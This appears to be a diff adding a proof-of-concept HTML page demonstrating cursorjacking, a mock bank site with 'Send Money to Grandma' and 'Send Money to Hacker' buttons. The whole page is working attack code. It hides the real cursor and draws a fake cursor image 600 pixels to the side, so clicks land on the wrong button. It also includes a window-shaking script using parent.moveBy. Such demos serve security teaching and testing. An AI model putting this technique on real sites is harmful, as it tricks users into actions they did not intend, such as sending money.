@@ -1,0 +1,45 @@
+<html>
+<head><title>Cursorjacking</title>
+<style>
+body,html {margin:0;padding:0}
+</style>
+</head>
+<body>
+<div style="margin-left:300px;">
+	<h1>Super Legitimate Bank Website</h1>
+</div>
+<button type="button" style="position:absolute;top:130px;left:600px;font-size: 1em;">Send Money to Grandma</button>
+<button type="button" style="position:absolute;top:130px;left:30px;font-size: 1em;">Send Money to Hacker</button>
+
+<img style="position: absolute;z-index:1000;" id=cursor src="cursor.png" />
+<style>
+body {
+	cursor:none;
+	height: 1000px;
+}
+</style>
+<script>
+function shake(n) {
+if (parent.moveBy) {
+for (i = 10; i > 0; i--) {
+for (j = n; j > 0; j--) {
+parent.moveBy(0,i);
+parent.moveBy(i,0);
+parent.moveBy(0,-i);
+parent.moveBy(-i,0);
+         }
+      }
+   }
+}
+
+shake(5);
+  var  oNode = document.getElementById('cursor');
+
+  var onmove = function (e) {  
+    var nMoveX =  e.clientX, nMoveY =  e.clientY; 
+    oNode.style.left = (nMoveX + 600)+"px";  
+    oNode.style.top = nMoveY + "px";  
+  }; 
+  document.body.addEventListener('mousemove', onmove, true);
+</script>
+</body>
